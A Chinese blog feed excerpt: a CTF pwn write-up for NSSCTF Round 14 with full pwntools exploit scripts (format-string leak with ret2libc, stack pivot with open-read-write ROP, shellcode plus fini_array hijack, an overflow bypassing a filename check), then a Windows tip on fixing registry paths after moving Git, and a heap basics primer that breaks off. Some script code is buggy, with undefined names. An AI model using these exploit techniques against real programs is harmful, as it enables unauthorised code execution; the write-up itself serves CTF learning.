    <content type="html"><![CDATA[<p>周末 NSS 的 PWN 专题，菜菜的照着别的师傅的 WP 复现一下🫥</p><span id="more"></span><h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><blockquote><p>格式化字符串+ret2libc</p></blockquote><p>是个64位的程序，开启了 canary 保护</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_main.png"></p><p>主函数中有一个明显的格式化字符串漏洞，在 <code>vlun</code> 函数中 gets 不限制输入</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_vuln.png"></p><p>考虑里用格式化字符串泄露 libc 基址，计算偏移获取 system 地址。再利用 gets 改写 GOT 表获取 shell。</p><p>格式化字符串部分 buf 存储在 BSS 段上，需要借用栈上的跳板。利用 GDB 查看 printf 处的栈数据：</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_stack.png"></p><p>栈上的第三个参数，也就是格式化字符串的第九个参数 0x7fffffffdfb8 存储的是0x7fffffffdfa8 地址，而这个地址存储 v4 的数值 （555LL 就是以十六进制存储555 这个十进制数字，就是 0x22b；同理 520LL就是 0x208），我们可以直接来改写 V4 数值实现 main 函数中的 if 条件判断进入 vuln 漏洞函数。</p><p>同时栈上的第九个参数 ( <code>%15$</code> )存储的是 canary 的值，第十一个参数 ( <code>%17$</code> ) 指向 <code>__libc_start_main+231</code>，可以推算出 libc 的基址。</p><p>所以我们的格式化字符串就构造为 <code>%520c%9$n,,%15$p,,%17$p</code>（其中 <code>,,</code> 用来分隔不同地址）</p><p>最终的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>pop_rdi=<span class="hljs-number">0x4013f3</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>payload=<span class="hljs-string">&quot;%520c%9$n,,%15$p,,%17$p&quot;</span><br>io.recvuntil(<span class="hljs-string">&#x27;I want to hear your praise of Toka\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>base=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">b&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">231</span><br>sys_addr=base+libc.sym[<span class="hljs-string">b&quot;system&quot;</span>]<br>sh_addr=base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload=cyclic(<span class="hljs-number">0x28</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;I know you like him, but you must pass my level\n&quot;</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h1><blockquote><p>栈迁移 + orw</p></blockquote><p><code>vuln()</code> 函数里面有一个长度0x10 的栈溢出，所以我们首先考虑栈迁移的利用 。同时在 <code>init()</code> 里面调用了<code>sandbox()</code> 禁用了execve，所以要使用 orw 。</p><p>首先移栈到 bss 然后利用 leave_ret ，移栈到前部执行泄露并回到 vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>bss=<span class="hljs-number">0x404800</span><br>leave_ret=<span class="hljs-number">0x40121d</span><br>pop_rdi=<span class="hljs-number">0x401353</span><br>read_addr=<span class="hljs-number">0x401292</span><br>vuln_addr=<span class="hljs-number">0x401270</span><br>puts_got=elf.got[<span class="hljs-string">b&quot;puts&quot;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">b&quot;puts&quot;</span>]<br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss)+p64(read_addr) <br>io.sendafter(<span class="hljs-string">b&quot;try it&quot;</span>,payload)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)<br>payload= payload.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(bss-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br><br>io.sendline(payload)<br>leak_addr=u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-libc.sym[<span class="hljs-string">b&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(leak_addr))<br>open_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;open&quot;</span>]<br>read_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;read&quot;</span>]<br>write_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;write&quot;</span>]<br><span class="hljs-comment">#pop_rsi = libc.address + next(libc.search(asm(&#x27;pop rsi;ret&#x27;))) </span><br><span class="hljs-comment">#pop_rdx = libc.address + next(libc.search(asm(&#x27;pop rdx;ret&#x27;))) </span><br><span class="hljs-comment">#不知道为什么我用上面的命令突然就抽风不好用我手动ROPgadget找的，就是有点子慢</span><br>pop_rsi=leak_addr+<span class="hljs-number">0x2601f</span><br>pop_rdx=leak_addr+<span class="hljs-number">0x142c92</span><br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;try it\n&quot;</span>,payload)<br><br>orw=<span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span>+p64(pop_rdi)+p64(<span class="hljs-number">0x404288</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(read_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(write_addr)<br><br>orw=orw.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&quot;a&quot;</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br>io.send(orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>题目是一个任何保护都没有被开启并且 rwx 全部开启的程序</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_xor_main.png"></p><p>首先程序中有一个 flag 判断的循环，我们要保证 flag 小于 0 程序才不会退出，方便我们进行接下来的操作。</p><p>我们可以将 flag 的高位写成 0xff，这样的话 flag 的符号位会被覆写为1，即负数。</p><p><code>xorByteWithAddress()</code> 中只有两行代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">xorByteWithAddress</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-type">char</span> a2)</span><br>&#123;<br>  *a1 ^= a2;  <span class="hljs-comment">//*addr ^= value</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)++flag;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>a1</code> 是一个指向 <code>_BYTE</code> 类型的地址（即一个字节大小的数据类型），所以在这个异或的操作中，一次只能异或改写一字节的数据。</p><p>因为 rwx 可读可写可执行，我们可以直接向上面写入 sehllcode，劫持 <code>fini_array</code> 指针到shellcode处，这样我们就可以再次异或令 flag 大于零，退出程序时执行 shellcode 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorwrite</span>(<span class="hljs-params">addr,value</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;addr:&quot;</span>,<span class="hljs-built_in">hex</span>(addr).encode())<br>    io.sendlineafter(<span class="hljs-string">b&quot;value:&quot;</span>,value)<br><br>flag=<span class="hljs-number">0x600BCC</span><br>fini_array=<span class="hljs-number">0x600970</span><br>rwx_addr=<span class="hljs-number">0x600d00</span><br><br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br><br>shellcode=asm(shellcraft.sh())<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(shellcode)):<br>    xorwrite(rwx+i,shellcode[i])<br>    <br><span class="hljs-comment">#xor_array=fini_array^rwx_addr</span><br><span class="hljs-comment">#xor_array=0x200b10</span><br>xorenc(<span class="hljs-built_in">hex</span>(fini_array).encode(),<span class="hljs-string">b&quot;0x10&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">1</span>).encode(),<span class="hljs-string">b&quot;0x0b&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">2</span>).encode(),<span class="hljs-string">b&quot;0x20&quot;</span>)<br>    <br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h1><p>是一个64位的菜单式的读取文件的程序，远程时可以直接读取服务器端的文件。</p><p>但是在 load_file 处有 “flag” 字符检测，也就是说我们不能直接 load flag，要尝试修改 flag 文件的 “flag” 字符。</p><p>同时在 read_file 处有文本长度的判断，不过长素质由用户输入，小于55时会自动读取 content_size + 56 的数据。</p><p>我们首先需要绕过 flag 的检查。</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_load.png"></p><p>在 <code>load_file()</code> 函数中，scanf 负责接受用户读入信息。我们知道scanf读取数据会在指定长度的数据后添加<code>\x00 </code>空字符</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_bss.png"></p><p>如上图，<em>file_name</em> 和 <em>file_id</em> 都是储存在 BSS 段并且相邻，偏移相差 8 字节。也就是说如果我们在 file_name 读取了刚好8字节的数据，其对应的 <code>\x00</code> 就会覆盖住 <em>file_id</em>，使 <em>file_id</em> 为 0。</p><p>而利用到 fild_id 的函数 <code>read(file_fd, file_content, content_size);</code> 在 fild_id&#x3D;0 时会从用户键盘来获取用户的输入而不是读取文件。</p><p>又因为在此之前由 alloca 来分配 v2 栈空间，我们可以利用 content_size 小于55的条件判断造成溢出，直接覆盖返回地址使程序跳转到 <code>file_fd = open(file_name, 0, 0LL);</code>，绕过检查再按照程序流程正常读取 flag 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">payload</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;file_name : &quot;</span>,payload)<br>    <br>load_addr=<span class="hljs-number">0x401493</span><br>read_addr=<span class="hljs-number">0x4014ee</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>load(<span class="hljs-string">b&quot;./&quot;</span>)<br>load(<span class="hljs-string">b&quot;flag.txt&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload=cyclic(<span class="hljs-number">0x18</span>)+p64(load_addr)+p64(ret)*<span class="hljs-number">2</span>+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;read more &quot;</span>,payload)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>格式化字符串</tag>
      
      <tag>libc</tag>
      
      <tag>orw</tag>
      
      <tag>stack pivoting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序修改路径后图标消失及右键无法打开的解决方案</title>
    <link href="/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<p>修改程序路径后需要进行的一些操作 </p><span id="more"></span><h2 id="更改Git目录后，鼠标右键点击Git-Bash-Here出现找不到应用程序及图标变灰"><a href="#更改Git目录后，鼠标右键点击Git-Bash-Here出现找不到应用程序及图标变灰" class="headerlink" title="更改Git目录后，鼠标右键点击Git Bash Here出现找不到应用程序及图标变灰"></a>更改Git目录后，鼠标右键点击Git Bash Here出现找不到应用程序及图标变灰</h2><p>我刚放假的时候整理了自己的文件们，就把 git 的安装目录改了，我想要用 git 传大文件上 github 就出现了如题所见的问题</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-38-05.png"></p><p>在这里点击的时候打不开，只有手动打开 Git 才会弹出弹窗</p><p>这是因为注册表没有修改</p><p>win+R，输入 regedit 打开注册表</p><p>Ctrl+F 查找目录 HKEY_CLASSES_ROOT\ Directory \ Background \ shell \</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_12-02-51.png"></p><p>就会发现注册表中的地址还是原来的地址，修改为移动后的地址即可</p><p>还有下面的shell文件夹中找到git相关的部分也需要修改，在git_gui主目录点一次，commd单独再点开。总共需要修改八处。</p><p>修改后就可以啦</p><h2 id="修改程序路径后，程序仍可使用但图标消失或变成白块"><a href="#修改程序路径后，程序仍可使用但图标消失或变成白块" class="headerlink" title="修改程序路径后，程序仍可使用但图标消失或变成白块"></a>修改程序路径后，程序仍可使用但图标消失或变成白块</h2><p>以Git Bash为例</p><p>这是因为我们点击的图案和搜索或是导航栏中显示的图标都是”快捷方式“，而它对应的路径没有修改</p><p>找到桌面或者开始菜单下找到 Git Bash 快捷方式，右键查看属性就会发现在属性中，”目标“栏里还是之前的路径，我们修改它到移动后的路径即可。</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-47-13.png"></p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆概述</title>
    <link href="/2023/07/19/%E5%A0%86%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/07/19/%E5%A0%86%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<p>堆的一些基础知识🤪</p><span id="more"></span><h1 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h1><p>堆实际上就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向生长。在程序运行的过程中，堆可以提供动态分配的内存，允许申请大小未知的内存。</p><p>你可以把它看成一个结构体数组，数组里每个元素都会开辟一块内存来存储数据，这块用来存储数据的内存就是堆。结构体数组在BSS段上，其内容就是堆的地址，也就是堆的指针。</p><p>总的来说，和堆有关的部分被划分为了2块，即管理区块和数据存放区块。数据存放区块就是堆，管理区块可以对堆增删改查，也就是堆管理器。</p><p>我们一般称管理堆的那部分程序为堆管理器。堆管理器处于用户程序与内核中间，主要做以下工作：</p><ul><li><p>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。</p><p>为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，由内存管理器来通过过某种算法管理这块内存。只有这块堆空间不足时，堆管理器才会再次与操作系统进行交互。</p></li><li><p>管理用户所释放的内存。</p><p>用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</p></li></ul><blockquote><p>当前 Linux 使用的堆分配器被称为 ptmalloc2，在 glibc 中实现。</p></blockquote><p>需要注意的是，Linux系统中，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 也就是说虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p><h1 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h1><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">heap   <span class="hljs-comment">#查看堆块</span><br>bin    <span class="hljs-comment">#查看bin区块</span><br>p &amp;__free_hook <span class="hljs-comment">#查看某个函数的真实地址</span><br>p *__free_hook <span class="hljs-comment">#查看某个函数的指向</span><br>x/xxgx 0xxxx <span class="hljs-comment">#查看某个地址的内存</span><br>vmmap<br></code></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><code>malloc()</code> 是动态内存分配函数。它接收一个参数，即所需分配的内存大小（以字节为单位），并返回指向分配内存起始位置的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li>如果 <em>size</em> &#x3D;0，将返回当前系统允许的堆的最小内存块（最小值 min 为0x20）</li><li>如果 <em>size</em> 为负数，由于大部分的系统上 <em>size_t</em> 都是无符号数，所以程序就会分配很大的一块内从空间，但因为系统没有那么多的内存可以分配，通常都会分配失败。</li><li>如果 malloc() 分配失败，返回的指针将为 NULL。</li></ul><blockquote><p>malloc() 分配的内存空间在使用完后需要手动释放，否则可能导致内存泄漏。</p></blockquote><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><code>free()</code> 是动态内存分配函数。它接受一个参数，即要释放的内存块的起始地址，此函数没有返回值。需要释放的内存空间可能由 <code>malloc()</code>、<code>calloc()</code> 或 <code>realloc() </code> 分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>;<br></code></pre></td></tr></table></figure><ul><li>当P为空指针，函数并不会执行任何操作</li><li>当 p 已经被释放之后，再次释放会出现 <code>double free </code> 错误 </li><li>除了被禁用 (mallopt) 的情况，如果是释放一块很大的内存空间，程序会将这块内存空间还给系统，以便减小程序所使用的内存空间。</li></ul><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc2 内部用 <code>malloc_chunk</code> 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p>无论chunk的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。但是根据是否被释放，不同的chunk的表现形式会有所不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">struck malloc_chunk&#123;<br>    INTERNAL_SIZE_T prev_size;<br>    INTERNAL_SIZE_T size;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><strong>prev_size</strong> ：记录前一个较低地址的空闲的 chunk 的大小（包括chunk头）</p><p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用，并将其用于扩展当前内存块的可用空间。这就是 chunk 中的空间复用。</p></li><li><p><strong>size</strong> ：记录的是当前 chunk 的大小，且 <strong>size 的大小必须是 2 * SIZE_SZ 的整数倍</strong>（32 位系统中，<em>SIZE_SZ</em> 是 4；64 位系统中，<em>SIZE_SZ</em> 是 8）。</p><p>如果申请的内存大小不是 <code>2 * SIZE_SZ</code> 的整数倍，会被转换满足大小的最小的 <code>2 * SIZE_SZ</code> 的倍数。</p><p>该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示：</p><ul><li><p><strong>NON_MAIN_ARENA</strong>：记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于</p></li><li><p><strong>IS_MAPPED</strong>：记录当前 chunk 是否是由 mmap 分配的。</p></li><li><p><strong>PREV_INUSE</strong>：记录前一个 chunk 块是否被分配。</p><p>一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 <em>prev_size</em> 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul></li></ul><blockquote><p>物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p></blockquote><ul><li><p><strong>fd，bk</strong> ：两个指针变量，用于构建双向链表，只有 chunk 空闲时才会被使用。</p><p>堆管理器会将其添加到适当的空闲内存块链表中统一管理。在链表中，每个空闲内存块都会有指向前一个内存块和后一个内存块的指针。</p><ul><li><strong>fd</strong> ：指向下一个（非物理相邻）空闲的 chunk</li><li><strong>bk</strong> ：指向上一个（非物理相邻）空闲的 chunk</li></ul></li><li><p><strong>fd_nextsize， bk_nextsize</strong> ：两个指针变量，和 fd，bk 作用相同，用于较大的 chunk （large chunk）。</p><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</p><ul><li><p><strong>fd_nextsize</strong> ：指向前一个与当前 chunk 